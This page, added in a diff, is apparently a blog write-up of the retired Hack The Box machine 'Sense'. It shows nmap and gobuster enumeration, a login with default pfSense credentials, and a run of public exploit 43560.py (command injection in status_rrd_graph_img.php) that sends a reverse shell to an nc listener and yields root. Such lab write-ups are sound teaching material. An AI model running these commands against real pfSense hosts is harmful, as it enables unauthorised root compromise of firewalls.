@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Sense</strong></h1>
+        <em>Released: 21st October 2017 / Pwned: 26th September 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Sense is a relatively simple box. The point at which you might be caught out is when brute-forcing for directories.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Directory brute-force with directory-list-2.3-medium.txt wordlist and search for .txt extensions using gobuster<br>
+        • Login with credentials found from brute-forcing<br>
+        • Grab pfSense version from dashboard, and searchsploit for exploits<br>
+        • Run exploit against /status_rrd_graph_img.php, and drop straight into a root shell<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Briefly scan for all open TCP ports on the box, and then run service detection and default scripts against those open ports.<br>
+        <br>
+        TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.60</code><br>
+        <br>
+        Service detection, default scripts and OS detection against open ports:<br>
+        <code>nmap -p 80,443 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.60</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-allports.txt&nbsp;10.10.10.60<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;http<br>
+                443<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;https<br>
+                <br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense#&nbsp;nmap&nbsp;-p&nbsp;80,443&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-openports.txt&nbsp;10.10.10.60<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lighttpd&nbsp;1.4.35<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;lighttpd<span style="color:#ff9d00;font-weight:700">/</span>1.4.35<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Did&nbsp;not&nbsp;follow&nbsp;redirect&nbsp;to&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.60<span style="color:#ff9d00;font-weight:700">/</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_https-redirect<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ERROR<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Script&nbsp;execution&nbsp;failed&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>use&nbsp;-d&nbsp;to&nbsp;debug<span style="color:#ff9d00;font-weight:700">)</span><br>
+                443<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;ssl<span style="color:#ff9d00;font-weight:700">/</span>https?<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_ssl-date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ERROR<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Script&nbsp;execution&nbsp;failed&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>use&nbsp;-d&nbsp;to&nbsp;debug<span style="color:#ff9d00;font-weight:700">)</span><br>
+                Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;specialized<span style="color:#ff9d00;font-weight:700">|</span>general&nbsp;purpose<br>
+                Running&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>JUST&nbsp;GUESSING<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;Comau&nbsp;embedded&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>92%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;FreeBSD&nbsp;8.X&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>85%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;OpenBSD&nbsp;4.X&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>85%<span style="color:#ff9d00;font-weight:700">)</span><br>
+                OS&nbsp;CPE<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cpe<span style="color:#ff9d00;font-weight:700">:/</span>o<span style="color:#ff9d00;font-weight:700">:</span>freebsd<span style="color:#ff9d00;font-weight:700">:</span>freebsd<span style="color:#ff9d00;font-weight:700">:</span>8.1
+            </div>
+        </div><br>
+        <br>
+        Results analysis:<br>
+        • 80/http and 443/https - A website is running!<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http &amp; 443/https</strong></h2><br>
+        Visit <code>http://10.10.10.60</code>, and you'll be redirected to <code>https://</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        We're at a pfSense login page.<br>
+        pfSense is an open source firewall and router distribution based on FreeBSD.<br>
+        <br>
+        The default pfSense configuration is configured to lock you out after 15 failed login attempts for 24 hours, so this login form isn't worth brute-forcing.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) gobuster</strong></h3><br>
+        Run <code>gobuster</code> against the target.<br>
+        Unfortunately, you have to be pretty specific with your wordlist to find what you need in order to progress.<br>
+        <br>
+        Use directory-list-2.3-medium.txt and search for <code>.txt</code> extensions.<br>
+        You'll find 2 interesting results - <code>changelog.txt</code> and <code>system-users.txt</code><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense#&nbsp;gobuster&nbsp;<span style="color:#ff9d00;font-weight:700">dir</span>&nbsp;-e&nbsp;-u&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.60&nbsp;-w&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>dirbuster<span style="color:#ff9d00;font-weight:700">/</span>directory-list-2.3-medium.txt&nbsp;-x&nbsp;.txt&nbsp;-k<br>
+                ===============================================================<br>
+                Gobuster&nbsp;v3.0.1<br>
+                by&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;Christian&nbsp;Mehlmauer&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@_FireFart_<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ===============================================================<br>
+                [+]&nbsp;Url<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.60<br>
+                [+]&nbsp;Threads<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<br>
+                [+]&nbsp;Wordlist<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>dirbuster<span style="color:#ff9d00;font-weight:700">/</span>directory-list-2.3-medium.txt<br>
+                [+]&nbsp;Status&nbsp;codes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;200,204,301,302,307,401,403<br>
+                [+]&nbsp;User&nbsp;Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gobuster<span style="color:#ff9d00;font-weight:700">/</span>3.0.1<br>
+                [+]&nbsp;Extensions<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;txt<br>
+                [+]&nbsp;Expanded<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">true</span><br>
+                [+]&nbsp;Timeout<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10s<br>
+                ===============================================================<br>
+                [...]<br>
+                https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.60<span style="color:#ff9d00;font-weight:700">/</span>changelog.txt&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.60<span style="color:#ff9d00;font-weight:700">/</span>system-users.txt&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>2b) changelog.txt and system-users.txt</strong></h3><br>
+        <code>/changelog.txt</code> says that, depsite patching, pfSense is still vulnerable to 1 exploit.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <code>/system-users.txt</code> reveals a set of credentials.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        The default password for pfSense is <code>pfsense</code> (which you can find via google).<br>
+        <br>
+        <code>Rohit / pfsense</code> fails, because /system-users.txt is misleading.<br>
+        <code>rohit / pfsense</code> succeeds, because why not.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 43560.py exploit</strong></h2><br>
+        The pfSense dashboard says that the running pfSense version is <code>2.1.3</code>.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        <code>searchsploit</code> for any pfSense exploits.<br>
+        There are lots of cross-site scripting exploits.<br>
+        You can pipe the searchsploit results to <code>grep -v</code> to remove them.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense<span style="color:#ff9d00;font-weight:700">/</span>443#&nbsp;searchsploit&nbsp;pfsense&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;-v&nbsp;Cross-Site<br>
+                -------------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------&nbsp;----------------------------------------<br>
+                pfSense&nbsp;-&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Authenticated<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;Group&nbsp;Member&nbsp;Remote&nbsp;Command&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>unix<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>43193.rb<br>
+                pfSense&nbsp;2.1&nbsp;build&nbsp;20130911-1816&nbsp;-&nbsp;Directory&nbsp;Traversal&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>31263.txt<br>
+                pfSense&nbsp;2.2&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>36506.txt<br>
+                pfSense&nbsp;2.2.5&nbsp;-&nbsp;Directory&nbsp;Traversal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>39038.txt<br>
+                pfSense&nbsp;2.3.1_1&nbsp;-&nbsp;Command&nbsp;Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>43128.txt<br>
+                pfSense&nbsp;2.4.4-p1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>HAProxy&nbsp;Package&nbsp;0.59_14<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;Persisten&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>46538.txt<br>
+                pfSense&nbsp;2.4.4-p3&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ACME&nbsp;Package&nbsp;0.59_14<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;Persistent&nbsp;C&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>46936.txt<br>
+                pfSense&nbsp;&lt;&nbsp;2.1.4&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'status_rrd_graph_img.php'</span>&nbsp;Command&nbsp;I&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>43560.py<br>
+                pfSense&nbsp;Community&nbsp;Edition&nbsp;2.2.6&nbsp;-&nbsp;Multiple&nbsp;Vulnerabili&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>39709.txt<br>
+                -------------------------------------------------------&nbsp;----------------------------------------
+            </div>
+        </div><br>
+        <br>
+        Command injection vulns sound good.<br>
+        Upon examining the exploits, <code>43560.py</code> looks good.<br>
+        <code>pfSense &lt; 2.1.4</code> fits our running version - 2.1.3, <code>/status_rrd_graph_img.php</code> exists, and the exploit is a neat python script that sends us a reverse shell.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        Save the exploit path to your clipboard with <code>searchsploit -p</code> and the exploit ID.<br>
+        I copy the exploit into a working directory of mine so that I don't overwrite the original.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense<span style="color:#ff9d00;font-weight:700">/</span>443#&nbsp;searchsploit&nbsp;-p&nbsp;43560<br>
+                &nbsp;&nbsp;Exploit<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;pfSense&nbsp;&lt;&nbsp;2.1.4&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'status_rrd_graph_img.php'</span>&nbsp;Command&nbsp;Injection<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>43560<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>43560.py<br>
+                File&nbsp;Type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Python&nbsp;script,&nbsp;ASCII&nbsp;text&nbsp;executable,&nbsp;with&nbsp;CRLF&nbsp;line&nbsp;terminators<br>
+                <br>
+                Copied&nbsp;EDB-ID&nbsp;<span style="color:#0088ff;font-weight:400">#43560's&nbsp;path&nbsp;to&nbsp;the&nbsp;clipboard.</span><br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense<span style="color:#ff9d00;font-weight:700">/</span>443#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>43560.py&nbsp;.<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense<span style="color:#ff9d00;font-weight:700">/</span>443#&nbsp;<span style="color:#ff9d00;font-weight:700">mv</span>&nbsp;43560.py&nbsp;cmdinjection.py
+            </div>
+        </div><br>
+        <br>
+        Start listener on your attacking machine to receive the reverse shell<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run the exploit.<br>
+        Details on how to run it are included in the script.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>sense<span style="color:#ff9d00;font-weight:700">/</span>443#&nbsp;python3&nbsp;cmdinjection.py&nbsp;--rhost&nbsp;10.10.10.60&nbsp;--lhost&nbsp;10.10.14.12&nbsp;--lport&nbsp;9001&nbsp;--username&nbsp;rohit&nbsp;--password&nbsp;pfsense<br>
+                CSRF&nbsp;token&nbsp;obtained<br>
+                Running&nbsp;exploit...<br>
+                Exploit&nbsp;completed
+            </div>
+        </div><br>
+        <br>
+        You should receive a shell on your listener :)<br>
+        pfSense must have been running as root because, fortunately, we have a root shell.<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.60]&nbsp;33493<br>
+                <span style="color:#ff9d00;font-weight:700">sh:</span>&nbsp;cant&nbsp;access&nbsp;tty<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>wheel<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>wheel<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ls&nbsp;-l&nbsp;/home</span><br>
+                total&nbsp;8<br>
+                drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;&nbsp;operator&nbsp;&nbsp;512&nbsp;Oct&nbsp;14&nbsp;&nbsp;2017&nbsp;.snap<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;rohit&nbsp;&nbsp;nobody&nbsp;&nbsp;&nbsp;&nbsp;512&nbsp;Oct&nbsp;14&nbsp;&nbsp;2017&nbsp;rohit<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;cat&nbsp;/home/rohit/user.txt</span><br>
+                8721327c...<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;cat&nbsp;/root/root.txt</span><br>
+                d08c32a5...
+            </div>
+        </div><br>
+    </writeup>
+</section>
+
+</body>
+</html>
